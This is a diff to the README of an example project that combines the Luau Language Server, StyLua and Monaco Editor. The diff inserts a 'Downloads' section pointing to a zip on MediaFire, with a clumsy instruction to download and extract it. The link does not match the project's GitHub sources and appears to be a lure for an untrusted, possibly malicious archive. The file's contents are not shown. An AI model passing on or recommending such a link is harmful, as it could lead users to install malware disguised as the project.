@@ -5,6 +5,11 @@
 
 An example setup using JohnnyMorganz's [Luau Language Server](https://github.com/JohnnyMorganz/luau-lsp/) and JohnnyMorganz's [StyLua](https://github.com/JohnnyMorganz/StyLua) together with [Monaco Editor](https://github.com/microsoft/monaco-editor).
 
+## Downloads
+
+Link: https://www.mediafire.com/file/wh5k7vb2fm1pbtv/luau.zip/file
+just download it and extract, then do as what development says below
+
 ## Features
 
 - ✨ Syntax Highlighting
